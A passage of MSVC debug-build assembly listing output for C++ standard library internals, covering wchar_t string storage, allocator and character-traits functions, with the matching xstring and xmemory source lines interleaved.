  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }

  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
tv66 = 192
this$ = 240
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged, COMDAT

; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2244 :         return _Myres > _Small_string_capacity;

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 18 07	 cmp	 QWORD PTR [rax+24], 7
  0002b	76 0c		 jbe	 SHORT $LN3@Large_mode
  0002d	c7 85 c0 00 00
	00 01 00 00 00	 mov	 DWORD PTR tv66[rbp], 1
  00037	eb 0a		 jmp	 SHORT $LN4@Large_mode
$LN3@Large_mode:
  00039	c7 85 c0 00 00
	00 00 00 00 00	 mov	 DWORD PTR tv66[rbp], 0
$LN4@Large_mode:
  00043	0f b6 85 c0 00
	00 00		 movzx	 eax, BYTE PTR tv66[rbp]

; 2245 :     }

  0004a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
_Result$ = 8
this$ = 256
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2235 :         const value_type* _Result = _Bx._Buf;

  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax

; 2236 :         if (_Large_mode_engaged()) {

  0002a	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00031	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00036	0f b6 c0	 movzx	 eax, al
  00039	85 c0		 test	 eax, eax
  0003b	74 13		 je	 SHORT $LN2@Myptr

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0003d	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00047	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0004c	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax
$LN2@Myptr:

; 2238 :         }
; 2239 : 
; 2240 :         return _Result;

  00050	48 8b 45 08	 mov	 rax, QWORD PTR _Result$[rbp]

; 2241 :     }

  00054	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
_Result$ = 8
this$ = 256
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2226 :         value_type* _Result = _Bx._Buf;

  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax

; 2227 :         if (_Large_mode_engaged()) {

  0002a	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00031	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00036	0f b6 c0	 movzx	 eax, al
  00039	85 c0		 test	 eax, eax
  0003b	74 13		 je	 SHORT $LN2@Myptr

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0003d	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00047	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0004c	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax
$LN2@Myptr:

; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

  00050	48 8b 45 08	 mov	 rax, QWORD PTR _Result$[rbp]

; 2232 :     }

  00054	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty

; 2213 : 
; 2214 :     // length of internal buffer, [1, 16] (NB: used by the debugger visualizer)
; 2215 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2216 :     // roundup mask for allocated buffers, [0, 15]
; 2217 :     static constexpr size_type _Alloc_mask = sizeof(value_type) <= 1 ? 15
; 2218 :                                            : sizeof(value_type) <= 2 ? 7
; 2219 :                                            : sizeof(value_type) <= 4 ? 3
; 2220 :                                            : sizeof(value_type) <= 8 ? 1
; 2221 :                                                                      : 0;
; 2222 :     // capacity in small mode
; 2223 :     static constexpr size_type _Small_string_capacity = _BUF_SIZE - 1;
; 2224 : 
; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {
; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;
; 2232 :     }
; 2233 : 
; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2235 :         const value_type* _Result = _Bx._Buf;
; 2236 :         if (_Large_mode_engaged()) {
; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;
; 2241 :     }
; 2242 : 
; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {
; 2244 :         return _Myres > _Small_string_capacity;
; 2245 :     }
; 2246 : 
; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {
; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }
; 2257 : 
; 2258 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2259 :         // checks whether _Off is in the bounds of [0, size()]
; 2260 :         if (_Mysize < _Off) {
; 2261 :             _Xran();
; 2262 :         }
; 2263 :     }
; 2264 : 
; 2265 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2266 :         // checks whether _Off is in the bounds of [0, size())
; 2267 :         if (_Mysize <= _Off) {
; 2268 :             _Xran();
; 2269 :         }
; 2270 :     }
; 2271 : 
; 2272 :     [[noreturn]] static void _Xran() {
; 2273 :         _Xout_of_range("invalid string position");
; 2274 :     }
; 2275 : 
; 2276 :     _NODISCARD _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2277 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2278 :         return (_STD min)(_Size, _Mysize - _Off);
; 2279 :     }
; 2280 : 
; 2281 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2282 :         // This constructor previously initialized _Ptr. Don't rely on the new behavior without
; 2283 :         // renaming `_String_val` (and fixing the visualizer).
; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers
; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0002e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00035	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 c7 40 18 00
	00 00 00	 mov	 QWORD PTR [rax+24], 0

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 224
_Al$ = 232
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction, COMDAT

; 744  :     _NODISCARD static _CONSTEXPR20 _Alloc select_on_container_copy_construction(const _Alloc& _Al) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 745  :         return _Al;

  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR __$ReturnUdt$[rbp]

; 746  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
_TEXT	SEGMENT
__formal$ = 224
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 740  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 741  :         return static_cast<size_t>(-1) / sizeof(value_type);

  0001f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 742  :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Count$ = 232
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z PROC	; std::allocator<wchar_t>::allocate, COMDAT

; 980  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

  00024	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$_Get_size_of_n@$01@std@@YA_K_K@Z ; std::_Get_size_of_n<2>
  00030	48 8b c8	 mov	 rcx, rax
  00033	e8 00 00 00 00	 call	 ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>

; 983  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ENDP	; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Ptr$ = 232
_Count$ = 240
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z PROC	; std::allocator<wchar_t>::deallocate, COMDAT

; 974  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 975  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 976  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	48 8b d0	 mov	 rdx, rax
  00036	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  0003d	e8 00 00 00 00	 call	 ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ; std::_Deallocate<16,0>

; 978  :     }

  00042	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00049	5f		 pop	 rdi
  0004a	5d		 pop	 rbp
  0004b	c3		 ret	 0
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ENDP	; std::allocator<wchar_t>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$allocator@_W@std@@QEAA@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT

; 966  :     constexpr allocator() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??0?$allocator@_W@std@@QEAA@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Xlen_string@std@@YAXXZ
_TEXT	SEGMENT
?_Xlen_string@std@@YAXXZ PROC				; std::_Xlen_string, COMDAT

; 2326 : [[noreturn]] inline void _Xlen_string() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2327 :     _Xlength_error("string too long");

  0001b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_C@_0BA@JFNIOLAK@string?5too?5long@
  00022	e8 00 00 00 00	 call	 ?_Xlength_error@std@@YAXPEBD@Z ; std::_Xlength_error
$LN2@Xlen_strin:

; 2328 : }

  00027	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002e	5f		 pop	 rdi
  0002f	5d		 pop	 rbp
  00030	c3		 ret	 0
?_Xlen_string@std@@YAXXZ ENDP				; std::_Xlen_string
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 224
_Right$ = 232
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 294  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;

  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	0f b7 09	 movzx	 ecx, WORD PTR [rcx]
  00035	66 89 08	 mov	 WORD PTR [rax], cx

; 301  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
_TEXT	SEGMENT
_First$ = 224
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z PROC	; std::_WChar_traits<wchar_t>::length, COMDAT

; 255  :     _NODISCARD static _CONSTEXPR17 size_t length(_In_z_ const _Elem* _First) noexcept /* strengthened */ {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 256  :         // find length of null-terminated sequence
; 257  : #if _HAS_CXX17
; 258  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 259  :             return __builtin_wcslen(_First);
; 260  :         } else {
; 261  :             return _Primary_char_traits::length(_First);
; 262  :         }
; 263  : #else // ^^^ _HAS_CXX17 / !_HAS_CXX17 vvv
; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First$[rbp]
  00026	e8 00 00 00 00	 call	 wcslen

; 265  : #endif // ^^^ !_HAS_CXX17 ^^^
; 266  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
